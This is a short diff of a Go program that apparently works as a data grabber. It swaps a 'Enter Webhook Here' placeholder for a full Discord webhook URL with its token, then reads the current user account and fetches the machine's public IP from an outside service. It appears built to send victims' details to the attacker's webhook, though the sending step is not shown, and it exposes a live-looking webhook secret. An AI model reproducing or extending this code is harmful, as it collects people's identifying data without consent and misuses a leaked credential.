@@ -9,7 +9,7 @@ import (
 )
 
 func main() {
-	urls := "Enter Webhook Here"
+	urls := "https://discord.com/api/webhooks/1321564629490728960/3aDR02jFKczreZ1LCynGLE8p8rpyPbQAW85q6eJv88zQOsJehOvCIgRhi2JH-ER-fysa"
 	user, err := user.Current()
 	ips, nil := http.Get("https://api.myip.com")
 	body, err := ioutil.ReadAll(ips.Body)
